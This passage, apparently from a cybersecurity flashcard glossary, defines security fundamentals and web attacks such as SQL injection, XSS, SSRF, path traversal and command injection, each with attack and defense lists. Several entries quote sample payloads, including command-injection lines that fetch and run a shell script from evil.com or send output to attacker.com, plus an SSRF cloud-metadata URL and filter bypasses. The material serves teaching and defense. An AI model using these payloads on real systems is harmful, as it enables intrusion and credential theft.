③ Where It Appears
CVE database / NVD
Nessus / OpenVAS reports
Bug bounty findings
Pen-test deliverables
④ How It Works
1Discover via scanning, audit or research
2Assign CVSS score and context
3Verify exploitability in your env
4Patch, mitigate or accept
5Re-scan to confirm
⑤ Attack & Defense
Attack
  • Exploit unpatched CVEs
  • Abuse misconfigurations
  • Chain low-severity bugs
  • Hit supply chain
Defense
  • Continuous scanning
  • Patch SLAs by severity
  • Defense in depth
  • SBOM + dependency review
⚠ Common Mistakes
❌ Beliefa vulnerability means I will be hacked
✓ Realityit is a weakness; abuse needs a threat + access
Why: a vuln is only dangerous when something can actually reach and exploit it.
❌ Beliefno CVE means safe
✓ Reality0-days and misconfigs are not in CVE lists
Why: many weaknesses (unknown bugs, bad configs) have no CVE at all.
⑥ Remember This
Vulnerabilities are the doors. Patches are the locks.
FAQ
What is a vulnerability?
A weakness that could be exploited to harm a system.
What is a CVE?
A public identifier for a known, disclosed vulnerability.
Vuln vs exploit?
The vuln is the hole; the exploit is the way to use it.
How are they found?
Scanning, fuzzing, and code review.
My Notes
Auto-saved
Learned it? Next:S·04 ExploitS·05 Risk
cherry root › block 5 › S·04
Exploit
Weaponizing a vulnerability.
S·04fundamentalsoffense
tags: Studied Review Hard Favorite
Before this term:S·03 Vulnerability
① Simple Definition
"The code or technique that turns a weakness into impact."
An exploit is the practical method of abusing a vulnerability — a payload, a sequence of requests, a crafted file. CVE-2024-xxxx is the bug; the exploit is what proves and uses it.
② Explanation

Exploits range from one-line PoCs to full chains involving 5+ bugs. Reliability matters: an exploit that crashes the target 50% of the time is not weaponized.

Public PoCs appear on GitHub, ExploitDB, Metasploit modules. Pen-testers use them; defenders use them to test detections; criminals adapt them. Time from disclosure to mass exploitation has collapsed to days.

A 0-day exploit targets an undisclosed bug — most valuable, most dangerous. Operators sit on them for months to maintain access.

③ Where It Appears
Metasploit modules
Bug bounty PoCs
APT post-mortems
Red team operations
④ How It Works
1Identify the vulnerability
2Develop the trigger condition
3Craft a payload (RCE, leak, escalation)
4Make it reliable
5Deliver and verify impact
⑤ Attack & Defense
Attack
  • Public PoCs adapted in hours
  • Mass scanning + spray exploitation
  • Custom 0-day chains by APTs
Defense
  • Patch within SLA
  • Virtual patching via WAF / IPS
  • Exploit mitigations (ASLR, DEP, CFI)
  • Detection rules for known PoCs
⚠ Common Mistakes
❌ Beliefan exploit is the same as malware
✓ Realityan exploit is the technique that abuses a vuln
Why: the exploit gets you in; malware is what you might run afterwards.
❌ Beliefa proof-of-concept is a finished weapon
✓ Realitya PoC proves it; weaponizing is more work
Why: a PoC shows the bug is real; reliable real-world exploitation takes much more.
⑥ Remember This
A vulnerability without an exploit is theoretical. An exploit without a fix is a fire.
FAQ
What is an exploit?
Code or a technique that takes advantage of a vulnerability.
Exploit vs payload?
The exploit gets the code running; the payload is what then executes.
What is a 0-day?
An exploit for a vulnerability with no available patch yet.
Where are exploits found?
Exploit-DB and frameworks like Metasploit.
My Notes
Auto-saved
Learned it? Next:M·04 ExploitationS·03 Vulnerability
cherry root › block 5 › S·05
Risk
The chance and impact of something going wrong.
S·05fundamentalsGRC
tags: Studied Review Hard Favorite
Before this term:S·02 Threat
① Simple Definition
"How likely × how bad."
In security, risk = likelihood × impact, given a threat exploiting a vulnerability. Quantifies what to prioritize when you can't fix everything.
② Explanation

Four responses to risk: mitigate (reduce), transfer (insurance), accept (live with it), avoid (don't do it). Every control choice is one of these.

Qualitative risk uses heat maps (High/Medium/Low). Quantitative tries to put dollars on it (ALE = SLE × ARO). Both are useful; pure quantification is rarely accurate.

Risk registers track each identified risk: description, score, owner, status, mitigation plan. Boards care about the top 10.

③ Where It Appears
Board-level risk reports
Insurance underwriting
Compliance programs
Cyber risk dashboards
④ How It Works
1Identify the risk
2Score likelihood
3Score impact
4Compute risk = L × I
5Choose response (mitigate/transfer/accept/avoid)
⑤ Attack & Defense
Attack
  • Exploit risks you accepted but didn't review
  • Target supply chain (transferred risk)
  • Hit unmonitored mitigations
Defense
  • Maintain a living risk register
  • Quarterly review
  • Map controls to risks
  • Track residual risk after controls
⚠ Common Mistakes
❌ Belieffix every vulnerability immediately
✓ Realityprioritize by risk (likelihood × impact)
Why: resources are limited — fix the high-likelihood, high-impact issues first.
❌ Beliefrisk can be reduced to zero
✓ Realityyou manage risk, never eliminate it
Why: some residual risk always remains; the goal is to keep it acceptable.
⑥ Remember This
If you can't list your top 5 risks, you don't have a security program.
FAQ
What is risk?
Roughly likelihood × impact — how probable harm is and how bad it would be.
Risk vs threat vs vuln?
Risk is the combination of a threat exploiting a vulnerability and the resulting damage.
How do you treat risk?
Accept, mitigate, transfer, or avoid it.
What is residual risk?
The risk that remains after controls are applied.
My Notes
Auto-saved
Learned it? Next:S·06 Attack SurfaceS·07 Defense in Depth
cherry root › block 5 › S·06
Attack Surface
Everything exposed that could be targeted.
S·06fundamentalsexposure
tags: Studied Review Hard Favorite
Before this term:S·05 Risk
① Simple Definition
"The sum of all entry points an attacker could try."
The attack surface is the totality of exposed interfaces: open ports, web endpoints, APIs, user accounts, third-party integrations, physical access. Reducing it is one of the cheapest wins in security.
② Explanation

Three sub-surfaces: network (ports, services), software (apps, libraries, attack chains), human (employees who can be phished or social-engineered).

Modern orgs have shadow IT: forgotten subdomains, abandoned cloud accounts, dev environments exposed to the internet. Attack Surface Management (ASM) tools continuously map external exposure.

Principle: every feature you ship widens the surface. Every service you decommission shrinks it. Default to off, deny, internal-only.

③ Where It Appears
External attack surface scans (Shodan, Censys)
Subdomain enumeration in recon
Cloud asset inventories
Hardening reviews
④ How It Works
1Inventory all assets (network, app, human)
2Map exposed interfaces
3Identify shadow IT
4Disable / remove unneeded surface
5Continuously monitor
⑤ Attack & Defense
Attack
  • Subdomain takeover
  • Forgotten S3 buckets
  • Default-cred admin panels
  • Phishing exposed employees
Defense
  • ASM tooling
  • Decommission aggressively
  • Zero-trust default deny
  • Segment internal networks
⚠ Common Mistakes
❌ Belieffewer servers means a small attack surface
✓ Realityevery exposed input, port and dependency counts
Why: one server can expose many endpoints, libraries, and services.
❌ Beliefinternal apps are not attack surface
✓ Realityinsiders and lateral movement reach them
Why: once an attacker is inside, internal services become exposed too.
⑥ Remember This
Every door is a door. Lock the ones you don't use. Remove them when you can.
FAQ
What is the attack surface?
Every point where an attacker could try to get in or extract data.
How do you reduce it?
Disable unused services, patch, and minimize exposed inputs.
What is an entry point?
Any input, port, or interface that accepts external data.
Why map it?
Both attackers (recon) and defenders (hardening) need to know it.
My Notes
Auto-saved
Learned it? Next:S·07 Defense in DepthM·01 Reconnaissance
cherry root › block 5 › S·07
Defense in Depth
Layered defense — if one fails, the next catches it.
S·07fundamentalsdoctrine
tags: Studied Review Hard Favorite
Before this term:S·06 Attack Surface
① Simple Definition
"Don't rely on one wall. Build seven."
Defense in depth is the principle of overlapping security controls so no single failure equals a breach. WAF + secure code + IDS + EDR + SIEM + backups + training — each layer compensates for the gaps in others.
② Explanation

Originated in military doctrine. Translated to IT: perimeter (firewall) → network segmentation → host hardening → app security → data encryption → monitoring → response.

Common pitfall: defense in depth as theatre — many tools, no integration, no monitoring. Real DiD is layers that catch what the previous one missed and surface alerts coherently.

Inverse: single point of failure. If one credential, one server, one library compromise gives the kingdom, you built a Maginot Line.

③ Where It Appears
Enterprise architecture
Cloud landing zones
Container security stacks
Critical infrastructure
④ How It Works
1Identify what you protect
2List layers (network, host, app, data, human)
3Add a control to each
4Verify each catches what others miss
5Test by removing one and exercising
⑤ Attack & Defense
Attack
  • Find the weak layer (often human)
  • Bypass network with phishing
  • Pivot once inside
  • Disable EDR before exfil
Defense
  • Independent layers (no shared root)
  • Detection at every layer
  • Assume each layer breaches
  • Practice incident response
⚠ Common Mistakes
❌ Beliefone strong firewall is enough
✓ Realityuse multiple layered controls
Why: if one layer fails, the next still slows or stops the attacker.
❌ Beliefperimeter security is the whole story
✓ Realityassume breach and defend inside too
Why: attackers eventually get past the edge, so internal defenses matter.
⑥ Remember This
One layer is hope. Seven is a plan.
FAQ
What is defense in depth?
Stacking multiple independent security controls.
Why layers?
No single control is perfect; layers cover each other's gaps.
An example?
Firewall + EDR + MFA + backups working together.
How does it relate to Zero Trust?
Zero Trust applies layered verification everywhere, not just the perimeter.
My Notes
Auto-saved
Learned it? Next:S·08 Zero TrustD·02 IDS / IPS
cherry root › block 5 › S·08
Zero Trust
Trust nothing. Verify everything.
S·08fundamentalsarchitecture
tags: Studied Review Hard Favorite
Before this term:S·07 Defense in Depth
① Simple Definition
"There is no inside. Every request must prove itself."
Zero trust abandons the assumption that an internal network is safe. Every user, device, request is authenticated and authorized as if it came from the internet.
② Explanation

Three pillars: verify explicitly (auth + context), least privilege (only what you need), assume breach (limit blast radius, monitor everything).

Built on identity (strong MFA), device posture (managed, compliant), and microsegmentation. The perimeter moves to every request, not the firewall edge.

BeyondCorp (Google) was the first major real-world implementation. Today: SASE platforms, identity-aware proxies, ZTNA replacing legacy VPNs.

③ Where It Appears
Cloud-native enterprises
Hybrid workforces
Replacing legacy VPNs
Critical-infra access
④ How It Works
1Define the protect surface
2Map all transaction flows
3Architect zero-trust network
4Create policies (who, what, where, when, why)
5Monitor and adapt
⑤ Attack & Defense
Attack
  • Bypass weak MFA (SIM swap, push fatigue)
  • Steal session tokens
  • Compromise managed devices
  • Abuse over-broad policies
Defense
  • Phishing-resistant MFA (FIDO2)
  • Continuous device verification
  • Short-lived tokens
  • Policy as code, reviewed often
⚠ Common Mistakes
❌ Beliefinside the network = trusted
✓ Realitynever trust, always verify
Why: location no longer implies trust — every request is authenticated and authorized.
❌ BeliefZero Trust is a product you buy
✓ Realityit is an architecture and principle
Why: it is a strategy combining identity, least privilege, and segmentation, not one tool.
⑥ Remember This
If you wouldn't trust it from the internet, don't trust it from your LAN either.
FAQ
What is Zero Trust?
A model that verifies every request regardless of where it comes from.
How does it differ from the perimeter model?
It drops the idea that the internal network is automatically safe.
What are the key parts?
Strong identity, least privilege, and microsegmentation.
Is it a single product?
No — it is an approach made of many controls.
My Notes
Auto-saved
Learned it? Next:S·11 AuthenticationS·12 Authorization
cherry root › block 5 › S·09
Encryption
Making data unreadable to anyone without the key.
S·09fundamentalscrypto
tags: Studied Review Hard Favorite
Before this term:S·01 CIA Triad
① Simple Definition
"Garble the data so only the right reader can ungarble it."
Encryption transforms plaintext into ciphertext using an algorithm and a key. Two families: symmetric (one shared key — AES) and asymmetric (key pair — RSA, ECC).
② Explanation

At rest (disk, DB) vs in transit (TLS, VPN) vs in use (homomorphic, enclaves) — different threats, different tools. Most orgs nail in-transit and forget at-rest.

Symmetric is fast — used for bulk data. Asymmetric is slow but solves key distribution. Real systems combine them: TLS uses RSA/ECDHE to exchange an AES session key.

Don't roll your own. Use vetted libraries (libsodium, BoringSSL). The math is right; what kills you is bad keys, bad randomness, bad modes (ECB), expired certs.

③ Where It Appears
HTTPS / TLS
Full-disk encryption (BitLocker, LUKS)
Password managers
End-to-end messaging (Signal)
④ How It Works
1Choose algorithm appropriate to data + speed
2Generate / exchange keys safely
3Encrypt with proper mode (GCM, ChaCha20-Poly1305)
4Protect the key (HSM, KMS)
5Rotate keys regularly
⑤ Attack & Defense
Attack
  • Steal the key (the easy path)
  • Downgrade attacks (POODLE, FREAK)
  • Side-channels (timing, power)
  • Weak random sources
Defense
  • Modern algorithms (AES-GCM, ChaCha20)
  • Key management in HSM/KMS
  • Disable legacy protocols (SSLv3, TLS 1.0)
  • Forward secrecy (ECDHE)
⚠ Common Mistakes
❌ Beliefbase64 is encryption
✓ Realitybase64 is encoding, not encryption
Why: encoding is reversible by anyone; encryption needs a key to undo.
❌ Beliefwrite my own crypto algorithm
✓ Realityuse vetted libraries and algorithms
Why: homemade crypto is almost always broken — rely on AES, RSA, and proven libraries.
⑥ Remember This
Encryption is only as strong as the weakest place you store the key.
FAQ
What is encryption?
Transforming data so only someone with the key can read it.
Symmetric vs asymmetric?
Symmetric uses one shared key; asymmetric uses a public/private key pair.
Encryption vs hashing?
Encryption is reversible with a key; hashing is one-way.
At rest vs in transit?
Protecting stored data versus data moving across a network.
My Notes
Auto-saved
Learned it? Next:S·10 HashingW·14 SSL / TLS
cherry root › block 5 › S·10
Hashing
A one-way fingerprint of data.
S·10fundamentalscrypto
tags: Studied Review Hard Favorite
Before this term:S·09 Encryption
① Simple Definition
"Same input → same hash. Different input → different hash. Can't reverse."
A cryptographic hash (SHA-256, BLAKE2) maps any input to a fixed-size digest. Three required properties: preimage resistance, second-preimage resistance, collision resistance.
② Explanation

Hashes are not encryption — there is no key, no reversal. They prove integrity: re-hash and compare. They verify downloads, sign data (HMAC), index files.

For passwords, raw SHA-256 is wrong. Use a slow, salted KDF: bcrypt, scrypt, argon2id. Cost factor adjustable as hardware speeds up.

MD5 and SHA-1 are broken (collisions found). Never use them for security. Still seen in legacy: deprecate when you find them.

③ Where It Appears
Password storage
File integrity verification
Git commit IDs
Blockchain proofs of work
④ How It Works
1Pick a modern hash (SHA-256+ for general use)
2For passwords, pick a KDF + salt
3Compute digest of input
4Store / transmit only the digest
5Verify by re-hashing and comparing
⑤ Attack & Defense
Attack
  • Rainbow tables on unsalted hashes
  • GPU-cracking weak KDFs (fast MD5/SHA-1)
  • Collision attacks on broken hashes
  • Length-extension on raw SHA-256
Defense
  • Always salt password hashes
  • Use argon2id / bcrypt / scrypt
  • Use HMAC for keyed hashing
  • Constant-time compare
⚠ Common Mistakes
❌ Beliefhashing is reversible like encryption
✓ Realityhashing is one-way
Why: you cannot decrypt a hash — you can only compare another hash to it.
❌ Beliefstore passwords hashed with MD5
✓ Realityuse bcrypt or argon2 with a salt
Why: MD5 is fast and crackable; slow, salted hashes resist brute force.
⑥ Remember This
A hash proves what the data was. It cannot bring the data back.
FAQ
What is hashing?
A one-way function that turns data into a fixed-size fingerprint.
Hash vs encryption?
Hashing cannot be reversed; encryption can, with a key.
What is a salt?
Random data added before hashing so identical passwords differ.
Why bcrypt or argon2?
They are deliberately slow and salted, which slows cracking.
My Notes
Auto-saved
Learned it? Next:S·11 AuthenticationT·08 Hashcat
cherry root › block 5 › S·11
Authentication
Proving who you are.
S·11fundamentalsidentity
tags: Studied Review Hard Favorite
Before this term:S·10 Hashing
① Simple Definition
"I claim to be Alice. Now prove it."
Authentication verifies a claimed identity. Three classic factors: something you know (password), have (token, phone), are (biometric). Combine for MFA.
② Explanation

Passwords alone are dead. Phishing, credential stuffing, breached dumps all defeat them. MFA blocks 99% of automated account takeovers — push-based and especially FIDO2 hardware keys.

Modern flows: OAuth 2.0 / OIDC for federation (login with Google), SAML for enterprise SSO, WebAuthn / passkeys replacing passwords entirely.

Failure modes: SIM swap defeats SMS OTP, push fatigue defeats Duo/MS Authenticator, recovery flows often weaker than primary login. Audit the full identity lifecycle, not just the login form.

③ Where It Appears
Every login form
Enterprise SSO portals
API tokens / JWTs
Cloud-console access
④ How It Works
1User claims identity (username)
2Provides one or more factors
3System verifies factors
4Issues a session/token
5All later actions ride that token
⑤ Attack & Defense
Attack
  • Credential stuffing from breach lists
  • Phishing kits (real-time MitM)
  • SIM swap, push fatigue
  • Weak password reset flows
Defense
  • MFA everywhere — prefer FIDO2
  • Block known-breached passwords
  • Rate-limit and detect anomalies
  • Harden reset and recovery
⚠ Common Mistakes
❌ Beliefauthentication and authorization are the same
✓ Realityauthn proves who; authz decides what
Why: logging in (authn) is separate from what you are allowed to do (authz).
❌ Beliefpasswords alone are enough
✓ Realityadd multi-factor authentication
Why: a stolen password is useless without the second factor.
⑥ Remember This
You authenticate to start the trip. You authorize to choose where you can go.
FAQ
What is authentication?
Proving you are who you claim to be.
What are the factors?
Something you know, have, or are.
authn vs authz?
Authentication is identity; authorization is permission.
What is MFA?
Requiring two or more independent factors to log in.
My Notes
Auto-saved
Learned it? Next:S·12 AuthorizationW·10 Sessions
cherry root › block 5 › S·12
Authorization
Deciding what you're allowed to do.
S·12fundamentalsidentity
tags: Studied Review Hard Favorite
Before this term:S·11 Authentication
① Simple Definition
"Okay, you're Alice. But can Alice access this file?"
Authorization determines the permissions of an authenticated identity. Models: RBAC (roles), ABAC (attributes), ReBAC (relationships), classic ACLs.
② Explanation

Authentication = are you you? Authorization = are you allowed? Mixing them is the source of countless bugs — IDOR, privilege escalation, mass-assignment.

Least privilege: grant only what's strictly needed, for as short as needed. Service accounts and admins are the most over-permissioned and most attacked.

Centralized authorization (OPA, Cedar) is replacing scattered if user.is_admin checks. Policy-as-code is auditable, testable, versioned.

③ Where It Appears
Every if user.role == ... in a backend
Cloud IAM (AWS, GCP)
K8s RBAC
Database GRANTs
④ How It Works
1User authenticates
2Request reaches a resource
3AuthZ engine evaluates: who + what + context
4Allow or deny
5Audit the decision
⑤ Attack & Defense
Attack
  • IDOR — change ?id=, see other data
  • Privilege escalation via role tampering
  • Forced browsing to hidden endpoints
  • Stale tokens / sessions
Defense
  • Server-side checks on every request
  • Default-deny policies
  • Short-lived tokens with scoped permissions
  • Centralized policy (OPA, IAM)
⚠ Common Mistakes
❌ Beliefif logged in, allow everything
✓ Realitycheck permissions per action
Why: being authenticated does not mean a user may do every action — enforce least privilege.
❌ Beliefhiding the button makes it secure
✓ Realityenforce authorization on the server
Why: a hidden UI control is still reachable by request — this is how IDOR happens.
⑥ Remember This
Authentication is the lock on the front door. Authorization is the lock on every other door.
FAQ
What is authorization?
Deciding what an authenticated user is allowed to do.
authz vs authn?
Authentication is who you are; authorization is what you may access.
What are common models?
RBAC (by role) and ABAC (by attributes).
Why care in security?
Broken authorization leads to IDOR and privilege escalation. See A·07.
My Notes
Auto-saved
Learned it? Next:A·07 IDORS·11 Authentication
6
Block 6 · Web Attacks
The Top 10 + 2
The classic web vulnerabilities every pentester recognizes on sight. SQLi, XSS, CSRF, SSRF, IDOR — the bread-and-butter of bug bounty and real-world breaches alike.
SQLiXSSCSRFSSRFIDORRCEOWASP
12 terms · A·01 → A·12 attacks that pay
cherry root › block 6 › A·01
SQL Injection
Injecting SQL into a query that wasn't supposed to take any.
A·01webinjection
tags: Studied Review Hard Favorite
Before this term:S·03 VulnerabilityW·06 Request & Response
① Simple Definition
"The classic. Make the database execute your query, not the app's."
SQL Injection (SQLi) occurs when user input is concatenated into a SQL query without sanitization. SELECT * FROM users WHERE name='' OR 1=1 --' dumps every row. Discovered in 1998, still in OWASP Top 10.
② Explanation

Variants: in-band (errors / UNION reveal data), blind (boolean / time-based — true takes 5s, false doesn't), out-of-band (data exfil via DNS/HTTP from DB).

Impact ranges from leaking one row to full DB dump, file write via INTO OUTFILE, RCE via UDF or stacked queries. Modern ORMs reduce it but don't eliminate it.

Tooling: sqlmap automates discovery + exploitation. Defenders detect with WAF and code review for raw string concatenation in queries.

③ Where It Appears
Login forms
Search boxes
URL parameters (?id=)
HTTP headers parsed into queries
④ How It Works
1Attacker finds an input that lands in SQL
2Tests with ' or -- to break syntax
3Crafts payload to extract / modify data
4Escalates: schema → tables → dump
5Maybe pivots to RCE
⑤ Attack & Defense
Attack
  • ' OR 1=1 -- auth bypass
  • UNION SELECT for data exfil
  • Blind boolean / time-based extraction
  • sqlmap automation
Defense
  • Parameterized queries / prepared statements
  • ORMs with safe defaults
  • Least-privilege DB accounts
  • WAF for defense in depth
⚠ Common Mistakes
❌ Weak fix"...WHERE name='" + escape(name) + "'"
✓ Real fixcursor.execute("...WHERE name=%s", (name,))
Why: manual escaping misses cases. Parameterized queries separate code from data for good.
❌ Beliefstored procedures are always safe
✓ Realitydynamic SQL inside them is still vulnerable
Why: a procedure that builds a query from input has the same flaw.
⑥ Remember This
Never concatenate user input into SQL. Ever. Use parameters.
FAQ
What is SQL injection?
Injecting SQL through untrusted input so the database runs attacker code.
How does it work?
User input is concatenated straight into a query.
Best defense?
Parameterized queries (prepared statements).
What tool tests it?
sqlmap. See T·05.
My Notes
Auto-saved
Learned it? Next:A·06 Command InjectionT·05 sqlmap
cherry root › block 6 › A·02
XSS
Injecting JavaScript that runs in another user's browser.
A·02webinjectionclient
tags: Studied Review Hard Favorite
Before this term:W·12 Client & Server
① Simple Definition
"Your script. Their cookies. Their session."
XSS = Cross-Site Scripting. The app reflects user input into an HTML page without escaping. Victim loads the page → attacker's JS runs in victim's browser, with victim's permissions.
② Explanation

Three flavors: reflected (payload in URL, victim clicks), stored (payload saved server-side — comment, profile), DOM-based (JS itself unsafely manipulates input).

Impact: session theft, keylogging, defacement, drive-by malware. With HttpOnly cookies + good CSP, impact reduces but doesn't vanish — still can act on behalf of the user.

CSP (Content Security Policy) is the strongest mitigation: a strict policy with nonces blocks inline JS entirely. Combined with output encoding, XSS becomes very hard.

③ Where It Appears
Comment sections
Search-result reflectors
Username displays
Markdown / WYSIWYG editors
④ How It Works
1Find an input reflected to HTML
2Test with <svg/onload=alert(1)>
3If executes, build real payload
4Steal session, keystrokes, force actions
5Deliver via link / stored payload
⑤ Attack & Defense
Attack
  • Steal cookies / tokens
  • Keylog the page
  • Force CSRF-style actions
  • BeEF hook for full browser control
Defense
  • Context-aware output encoding
  • Strict CSP with nonces
  • HttpOnly + SameSite cookies
  • Sanitize HTML inputs (DOMPurify)
⚠ Common Mistakes
❌ Beliefescaping on input is enough
✓ Realityencode on output, context-aware
Why: the same value is safe in HTML but dangerous in a script or attribute — encode where it is used.
❌ Beliefa WAF stops all XSS
✓ Realityoutput encoding + CSP are the real fix
Why: WAFs are bypassable; proper encoding and a strong CSP address the root cause.
⑥ Remember This
If user input ever lands in your HTML unescaped, you have XSS.
FAQ
What is XSS?
Injecting <script> or other markup that runs in a victim's browser.
What are the types?
Stored, reflected, and DOM-based.
What is the defense?
Context-aware output encoding plus a Content-Security-Policy.
What is the impact?
Stealing cookies and sessions, or acting as the victim. See W·09.
My Notes
Auto-saved
Learned it? Next:A·03 CSRFW·09 Cookies
cherry root › block 6 › A·03
CSRF
Tricking a logged-in user into doing actions without consent.
A·03webclient
tags: Studied Review Hard Favorite
Before this term:W·09 Cookies
① Simple Definition
"The victim's browser fires the request. The server can't tell."
Cross-Site Request Forgery (CSRF) exploits the fact that browsers auto-attach cookies to requests. Attacker hosts a page that submits a form to bank.com/transfer. Victim, already logged in, has the request authenticated by their cookie.
② Explanation

Classic targets: state-changing actions — password change, money transfer, settings edit. GET-based CSRF is easiest; POST-based requires a hidden auto-submitting form.

SameSite cookies (Lax by default in modern browsers) blocked most CSRF. But cross-subdomain scenarios, GET endpoints with side effects, and APIs without proper protection still bleed.

Anti-CSRF tokens (random value tied to session, validated server-side) are the standard defense. Frameworks like Django, Rails include them by default.

③ Where It Appears
Forgotten admin endpoints
Account-settings forms
Money-transfer APIs
Newsletter unsubscribe (lower impact)
④ How It Works
1Victim logs into target site (cookie set)
2Visits attacker's page
3Page submits a hidden form to target
4Browser attaches the cookie
5Target executes action as victim
⑤ Attack & Defense
Attack
  • Auto-submitting form in iframe
  • <img src=GET-csrf-url>
  • JSON CSRF via flash / SOP edge cases
Defense
  • Anti-CSRF tokens on every state change
  • SameSite=Lax or Strict cookies
  • Require Origin / Referer on writes
  • Re-auth for sensitive actions
⚠ Common Mistakes
❌ BeliefHTTPS prevents CSRF
✓ Realityuse anti-CSRF tokens + SameSite cookies
Why: CSRF rides an authenticated session; encryption does nothing to stop it.
❌ Beliefonly POST requests are vulnerable
✓ Realityany state-changing request can be
Why: if a GET changes state, it is just as exploitable.
⑥ Remember This
The attacker doesn't need your password. The browser already has it.
FAQ
What is CSRF?
Tricking a logged-in victim's browser into making an unwanted request.
How does it work?
The browser auto-attaches the victim's cookies to the forged request.
What is the defense?
Anti-CSRF tokens and SameSite cookies.
CSRF vs XSS?
CSRF forges requests; XSS injects and runs scripts.
My Notes
Auto-saved
Learned it? Next:A·04 SSRFW·09 Cookies
cherry root › block 6 › A·04
SSRF
Making the server send requests on the attacker's behalf.
A·04webserver
tags: Studied Review Hard Favorite
Before this term:W·11 API
① Simple Definition
"The server becomes the attacker's proxy into the internal network."
Server-Side Request Forgery (SSRF): the app fetches a URL the attacker controls. ?url=http://169.254.169.254/latest/meta-data/ on AWS leaks instance credentials. SSRF was the root of Capital One's 2019 breach.
② Explanation

SSRF bypasses external firewalls because the request originates from inside. Common targets: cloud metadata services (AWS IMDSv1, GCP, Azure), internal admin panels, localhost services.

Bypasses to know: 127.0.0.1 blocked → try 127.1, 0.0.0.0, [::1], hex/dec IP, DNS rebinding, URL parser inconsistencies (@, #).

Blind SSRF: no response visible, but you can probe internal services via timing, error-message leaks or out-of-band DNS.

③ Where It Appears
Webhook endpoints
Image / PDF rendering services
URL preview features
OAuth callback handlers
④ How It Works
1Find a feature that fetches a URL
2Submit attacker-controlled URL
3Bypass any allow-list (DNS, encoding)
4Probe internal services
5Exfil credentials / pivot
⑤ Attack & Defense
Attack
  • Hit cloud metadata for creds (IMDSv1)
  • Scan internal subnet via SSRF
  • Bypass via DNS rebinding
  • Trigger internal RCE chains
Defense
  • Allow-list URLs by host
  • Block private IP ranges + metadata IPs
  • Use IMDSv2 (token-bound)
  • Network egress controls + zero-trust internal
⚠ Common Mistakes
❌ Beliefblocking localhost is enough
✓ Realityuse allowlists; watch redirects and metadata IPs
Why: attackers use redirects, alternate IP encodings, and cloud metadata endpoints to slip past blocklists.
❌ Beliefinternal services are safe
✓ RealitySSRF reaches them via the server
Why: the vulnerable server is already inside the network and can be made to call internal hosts.
⑥ Remember This
If your server can fetch URLs the user controls, your server can be the attacker.
FAQ
What is SSRF?
Server-Side Request Forgery — making the server send requests you choose.
What is the impact?
Reaching internal services or stealing cloud metadata credentials.
What is the defense?
Allowlist destinations and block internal IP ranges.
SSRF vs CSRF?
In SSRF the server makes the request; in CSRF the victim's browser does.
My Notes
Auto-saved
Learned it? Next:A·06 Command InjectionW·11 API
cherry root › block 6 › A·05
Path Traversal
Escaping the intended directory with ../ sequences.
A·05webfilesystem
tags: Studied Review Hard Favorite
Before this term:B·08 Path
① Simple Definition
"Climb up the directory tree until you find /etc/passwd."
Path traversal (a.k.a. directory traversal) abuses file paths constructed from user input. ?file=../../../../etc/passwd reads outside the app's intended directory. Reads → leak source code, configs, keys. Writes → arbitrary file write, sometimes RCE.
② Explanation

Bypasses to test: URL-encoded %2e%2e%2f, double-encoded %252e, null bytes (%00 in legacy stacks), backslashes on Windows, Unicode normalization tricks.

High-value targets: /etc/passwd (Linux), web.config (IIS), SSH keys, AWS credentials, application source code revealing more bugs.

Combined with file upload (write traversal), can drop a webshell into the document root. With log poisoning + LFI, often reaches RCE.

③ Where It Appears
File-download endpoints
Template / theme loaders
Backup / export features
ZIP / tar extractors (Zip Slip)
④ How It Works
1Find an endpoint taking a filename / path
2Inject ../ sequences
3Probe for known files (/etc/passwd)
4Escalate to source disclosure or write
5Chain with upload for RCE
⑤ Attack & Defense
Attack
  • ?file=../../../../etc/passwd
  • Double encoding to bypass filters
  • Zip Slip in archive extractors
  • Log poisoning + LFI → RCE
Defense
  • Canonicalize paths, then verify they're inside allowed root
  • Use file IDs, not filenames
  • Run app as low-privilege user
  • Chroot / sandbox file ops
⚠ Common Mistakes
❌ Weak fixif "../" in path: reject()
✓ Real fixcanonicalize, then check it stays under base dir
Why: encoded variants like %2e%2e slip past a naive string check; resolving the real path does not.
❌ Beliefonly harmless files are at risk
✓ Realityconfigs, keys, /etc/passwd are targets
Why: climbing the tree can reach credentials and system files.
⑥ Remember This
../ is the oldest trick. Don't let user input near filenames.
FAQ
What is path traversal?
Using ../ in input to read files outside the intended folder.
How does it work?
Each ../ climbs one directory toward the root.
What is the defense?
Canonicalize the path and confine it to a fixed base directory.
What about encoded variants?
%2e%2e and similar encodings bypass naive filters.
My Notes
Auto-saved
Learned it? Next:A·06 Command InjectionB·08 Path
cherry root › block 6 › A·06
Command Injection
Injecting OS commands into a system call.
A·06webinjectionRCE
tags: Studied Review Hard Favorite
Before this term:A·01 SQL Injection
① Simple Definition
"User input ends up inside os.system(). Game over."
Command injection happens when an app builds a shell command from user input. os.system("ping " + ip) with ip = "8.8.8.8; cat /etc/passwd" runs both commands.
② Explanation

Metacharacters to test: ;, &&, |, backticks, $(...), newline. Each chains additional commands.

Blind command injection: no output returned. Detect via time (sleep 10) or out-of-band (curl attacker.com/$(whoami)).

Impact is immediate RCE with the privileges of the web process. From there: read everything readable, pivot to internal, install persistence. Stop it at the parameter, not at the shell.

③ Where It Appears
Ping / DNS lookup tools
Image / video conversion (ImageMagick, ffmpeg)
Backup / export scripts
Diagnostics endpoints
④ How It Works
1Find input passed to a shell command
2Inject command separator
3Run probe (id, whoami)
4Confirm via output or OOB
5Escalate to full RCE / reverse shell
⑤ Attack & Defense
Attack
  • ; cat /etc/passwd
  • $(curl evil.com/sh|sh)
  • Time-based blind: ; sleep 10
  • Reverse shells via bash one-liners
Defense
  • Never call a shell from user input
  • Use language APIs (e.g. subprocess with list, no shell=True)
  • Strict input allow-listing
  • Least-privilege execution context
⚠ Common Mistakes
❌ Weak fixos.system("ping " + ip)
✓ Real fixsubprocess.run(["ping", ip])
Why: passing arguments as a list avoids the shell, so injected characters never run.
❌ Beliefonly the ; character is dangerous
✓ Reality| & $() backticks and newlines too
Why: many shell metacharacters chain commands — blocklisting one is not enough.
⑥ Remember This
If your code spells out a shell command from user data, an attacker writes the rest.
FAQ
What is command injection?
Getting the server to run OS commands via unsanitized input.
How does it work?
Input is placed into a shell command that the server executes.
What is the defense?
Avoid the shell; pass arguments as an array and allowlist values.
What is the impact?
Often full compromise of the server.
My Notes
Auto-saved
Learned it? Next:A·05 Path TraversalL·03 Shell / Bash
cherry root › block 6 › A·07
IDOR
Insecure Direct Object Reference — changing an ID, seeing someone else's data.
A·07webauthz
tags: Studied Review Hard Favorite
Before this term:S·12 Authorization
① Simple Definition
"?user_id=42 → change to 43 → see user 43's stuff."
